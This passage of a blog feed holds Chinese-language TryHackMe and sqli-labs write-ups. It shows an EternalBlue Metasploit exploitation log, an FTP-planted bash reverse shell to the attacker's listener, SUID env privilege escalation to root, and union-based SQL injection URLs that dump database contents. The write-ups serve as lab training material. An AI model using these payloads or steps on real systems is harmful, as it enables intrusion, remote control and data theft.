or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain      .                no        (Optional) The Windows domain to use for authentication</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.9.248.83      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.9.248.83:4444 </span><br><span class="line">[*] 10.10.246.255:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 10.10.246.255:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 10.10.246.255:445     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] 10.10.246.255:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 10.10.246.255:445 - Connection established for exploitation.</span><br><span class="line">[+] 10.10.246.255:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 10.10.246.255:445 - CORE raw buffer dump (42 bytes)</span><br><span class="line">[*] 10.10.246.255:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br><span class="line">[*] 10.10.246.255:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span><br><span class="line">[*] 10.10.246.255:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span><br><span class="line">[+] 10.10.246.255:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 10.10.246.255:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 10.10.246.255:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 10.10.246.255:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 10.10.246.255:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 10.10.246.255:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 10.10.246.255:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 10.10.246.255:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 10.10.246.255:445 - Receiving response from exploit packet</span><br><span class="line">[+] 10.10.246.255:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 10.10.246.255:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 10.10.246.255:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (200262 bytes) to 10.10.246.255</span><br><span class="line">[*] Meterpreter session 1 opened (10.9.248.83:4444 -&gt; 10.10.246.255:49201) at 2021-01-15 05:54:08 -0500</span><br><span class="line">[+] 10.10.246.255:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.246.255:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.246.255:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-Demo&quot;&gt;&lt;a href=&quot;#0x01-Demo&quot; class=&quot;headerlink&quot; title=&quot;0x01.Demo&quot;&gt;&lt;/a&gt;0x01.Demo&lt;/h2&gt;&lt;img src=&quot;/2021/01/15/tryhackme-blue/image-20210115194912000.png&quot; class&gt;</summary>
    
    
    
    <category term="Tryhackme" scheme="https://lunamoore.github.io/categories/Tryhackme/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>tryhackme-[Anonymous]</title>
    <link href="https://lunamoore.github.io/2021/01/13/tryhackme-Anonymous/"/>
    <id>https://lunamoore.github.io/2021/01/13/tryhackme-Anonymous/</id>
    <published>2021-01-13T06:58:12.000Z</published>
    <updated>2021-01-13T07:01:13.189Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Demo"><a href="#0x01-Demo" class="headerlink" title="0x01.Demo"></a>0x01.Demo</h2><img src="/2021/01/13/tryhackme-Anonymous/image-20210113134507401.png" class><a id="more"></a><h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02.信息收集"></a>0x02.信息收集</h2><p><code>可以看到开放了4个端口21/22/139/445 其中ftp开放了匿名登入，且目录为scripts</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# nmap -sC -sV -sT 10.10.7.51 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-13 00:46 EST</span><br><span class="line">Nmap scan report for 10.10.7.51</span><br><span class="line">Host is up (0.36s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21/tcp  open  ftp         vsftpd 2.0.8 or later</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:10.9.248.83</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 5</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)</span><br><span class="line">|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)</span><br><span class="line">|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1s, deviation: 2s, median: 0s</span><br><span class="line">|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)</span><br><span class="line">|   Computer name: anonymous</span><br><span class="line">|   NetBIOS computer name: ANONYMOUS\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: anonymous</span><br><span class="line">|_  System time: 2021-01-13T05:48:13+00:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-01-13T05:48:11</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 157.83 seconds</span><br><span class="line">root@JIYE:~/tryhackme/anonymous#</span><br></pre></td></tr></table></figure><p><code>查看服务共享的资源，发现为pics</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# smbclient -L 10.10.7.51</span><br><span class="line">Enter WORKGROUP\root&#x27;s password: </span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        print$          Disk      Printer Drivers</span><br><span class="line">        pics            Disk      My SMB Share Directory for Pics</span><br><span class="line">        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))</span><br><span class="line">SMB1 disabled -- no workgroup available</span><br><span class="line">root@JIYE:~/tryhackme/anonymous#</span><br></pre></td></tr></table></figure><h2 id="0x03-匿名登入ftp"><a href="#0x03-匿名登入ftp" class="headerlink" title="0x03.匿名登入ftp"></a>0x03.匿名登入ftp</h2><p><code>发现scripts目录下的文件，并下载</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# ftp 10.10.7.51</span><br><span class="line">Connected to 10.10.7.51.</span><br><span class="line">220 NamelessOne&#x27;s FTP Server!</span><br><span class="line">Name (10.10.7.51:root): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> ls</span></span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts</span><br><span class="line">226 Directory send OK.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> <span class="built_in">cd</span> scripts</span></span><br><span class="line">250 Directory successfully changed.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> ls</span></span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh</span><br><span class="line">-rw-rw-r--    1 1000     1000          946 Jan 13 05:47 removed_files.log</span><br><span class="line">-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> get clean.sh</span></span><br><span class="line">local: clean.sh remote: clean.sh</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for clean.sh (314 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">314 bytes received in 0.00 secs (3.4820 MB/s)</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> get removed_files.log</span></span><br><span class="line">local: removed_files.log remote: removed_files.log</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for removed_files.log (989 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">989 bytes received in 0.57 secs (1.6842 kB/s)</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> get to_do.txt</span></span><br><span class="line">local: to_do.txt remote: to_do.txt</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for to_do.txt (68 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">68 bytes received in 0.60 secs (0.1115 kB/s)</span><br><span class="line"><span class="meta">ftp&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x04-查看文件"><a href="#0x04-查看文件" class="headerlink" title="0x04.查看文件"></a>0x04.查看文件</h2><p><code>发现clean.sh作用为删除/tmp下的文件，另外两个文件没有什么有用的东西</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# cat clean.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">tmp_files=0</span><br><span class="line">echo $tmp_files</span><br><span class="line">if [ $tmp_files=0 ]</span><br><span class="line">then</span><br><span class="line">        echo &quot;Running cleanup script:  nothing to delete&quot; &gt;&gt; /var/ftp/scripts/removed_files.log</span><br><span class="line">else</span><br><span class="line">    for LINE in $tmp_files; do</span><br><span class="line">        rm -rf /tmp/$LINE &amp;&amp; echo &quot;$(date) | Removed file /tmp/$LINE&quot; &gt;&gt; /var/ftp/scripts/removed_files.log;done</span><br><span class="line">fi</span><br><span class="line">root@JIYE:~/tryhackme/anonymous#</span><br></pre></td></tr></table></figure><h2 id="0x05-反弹shell"><a href="#0x05-反弹shell" class="headerlink" title="0x05.反弹shell"></a>0x05.反弹shell</h2><p><code>修改clean.sh并上传，文件内容如下</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# cat clean.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.9.248.83/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cDovL3BlbnRlc3Rtb25rZXkubmV0Lw==">shell利用<i class="fa fa-external-link-alt"></i></span></p><p><code>对服务器文件进行覆盖</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> put clean.sh clean.sh </span></span><br><span class="line">local: clean.sh remote: clean.sh</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Ok to send data.</span><br><span class="line">226 Transfer complete.</span><br><span class="line">54 bytes sent in 0.00 secs (1.0098 MB/s)</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> </span></span><br></pre></td></tr></table></figure><p><code>kali监听端口，使用rlwrap就可以使用键盘上下箭头了</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# rlwrap nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.9.248.83] from (UNKNOWN) [10.10.136.156] 49676</span><br><span class="line">bash: cannot set terminal process group (1144): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">whoami</span><br><span class="line">whoami</span><br><span class="line">namelessone</span><br><span class="line">ls</span><br><span class="line">ls</span><br><span class="line">pics</span><br><span class="line">user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">****************************</span><br></pre></td></tr></table></figure><h2 id="0x06-提权"><a href="#0x06-提权" class="headerlink" title="0x06.提权"></a>0x06.提权</h2><p><code>使用SUID提权</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/nul</span><br><span class="line">或者</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/bin/env</span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvZW52Lw==">env提权参考<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/env /bin/sh -p</span><br><span class="line">id</span><br><span class="line">uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)</span><br><span class="line">ls</span><br><span class="line">pics</span><br><span class="line">user.txt</span><br><span class="line">pwd</span><br><span class="line">/home/namelessone</span><br><span class="line">cd /root</span><br><span class="line">pwd</span><br><span class="line">/root</span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">cat root.txt</span><br><span class="line">*************************</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-Demo&quot;&gt;&lt;a href=&quot;#0x01-Demo&quot; class=&quot;headerlink&quot; title=&quot;0x01.Demo&quot;&gt;&lt;/a&gt;0x01.Demo&lt;/h2&gt;&lt;img src=&quot;/2021/01/13/tryhackme-Anonymous/image-20210113134507401.png&quot; class&gt;</summary>
    
    
    
    <category term="Tryhackme" scheme="https://lunamoore.github.io/categories/Tryhackme/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Sqli_labs_Page1(basic)</title>
    <link href="https://lunamoore.github.io/2021/01/10/Sqli-labs-Page1-basic/"/>
    <id>https://lunamoore.github.io/2021/01/10/Sqli-labs-Page1-basic/</id>
    <published>2021-01-10T05:39:49.000Z</published>
    <updated>2021-01-16T08:13:59.848Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Sqli_labs_Page1(basic)</strong></p><a id="more"></a><h2 id="0x01-Less-1-GET-基于报错-单引号"><a href="#0x01-Less-1-GET-基于报错-单引号" class="headerlink" title="0x01.Less-1 GET 基于报错 单引号"></a>0x01.Less-1 GET 基于报错 单引号</h2><p><code>正常访问</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=1</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230221905854.png" class><p><code>测试报错</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=1&#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230222040571.png" class><p><code>探测字段数</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=1&#x27; order by 1 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=1&#x27; order by 2 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=1&#x27; order by 3 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=1&#x27; order by 4 -- -</span><br></pre></td></tr></table></figure><p><code>到4回显，结果为3列</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230222525420.png" class><p><code>union注入，id需为一个不存在的数，进行爆库</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,database(),user() -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230223306403.png" class><p><code>爆表</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),3 -- -</span><br></pre></td></tr></table></figure><blockquote><p>select table_name from information_schema.tables where table_schema=’security’ limit 0,1;为查询security数据库的第一张表</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230225728017.png" class><p><code>依次类推，查询第二、三、四张~</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1),3 -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 2,1),3 -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),3 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230225821260.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230230132459.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230230220235.png" class><p><code>对emails表爆字段，下面为第一个字段</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;emails&#x27; limit 0,1),3 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230232717251.png" class><p><code>第二个字段与第三个字段如下，第三个字段为空</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;emails&#x27; limit 1,1),3 -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;emails&#x27; limit 2,1),3 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230232456670.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230232741394.png" class><p><code>知道了字段名与表名就可以读取数据了，读取到了本不该让用户读取到的内容</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,(select email_id from emails limit 0,1),3 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201230233414685.png" class><h2 id="0x02-Less-2-GET-基于报错-基于整型"><a href="#0x02-Less-2-GET-基于报错-基于整型" class="headerlink" title="0x02.Less-2 GET 基于报错 基于整型"></a>0x02.Less-2 GET 基于报错 基于整型</h2><p><code>同Less1，只需将单引号去掉即可</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-2/?id=0 union select 1,(select email_id from emails limit 0,1),3 -- -</span><br></pre></td></tr></table></figure><h2 id="0x03-Less-3-GET-基于报错-单引号-括号"><a href="#0x03-Less-3-GET-基于报错-单引号-括号" class="headerlink" title="0x03.Less-3 GET 基于报错 单引号+括号"></a>0x03.Less-3 GET 基于报错 单引号+括号</h2><p><code>同Less1，加一个括号，这是一个变形题</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-3/?id=0&#x27;) union select 1,(select email_id from emails limit 0,1),3 -- -</span><br></pre></td></tr></table></figure><h2 id="0x04-Less-4-GET-基于报错-双引号-括号"><a href="#0x04-Less-4-GET-基于报错-双引号-括号" class="headerlink" title="0x04.Less-4 GET 基于报错 双引号+括号"></a>0x04.Less-4 GET 基于报错 双引号+括号</h2><p><code>同Less3，只需将单引号换为双引号即可</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-4/?id=0&quot;) union select 1,(select email_id from emails limit 0,1),3 -- -</span><br></pre></td></tr></table></figure><h2 id="0x05-Less-5-GET-双注入-单引号"><a href="#0x05-Less-5-GET-双注入-单引号" class="headerlink" title="0x05.Less-5 GET 双注入 单引号"></a>0x05.Less-5 GET 双注入 单引号</h2><p><code>测试发现正常?id=1有回显，加上单引号会出现报错</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27;</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231174115897.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20201231174144932.png" class><p><code>接着测试发现当条件为假时没有回显，存在bool注入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and 1=1 -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and 1=2 -- -</span><br></pre></td></tr></table></figure><img 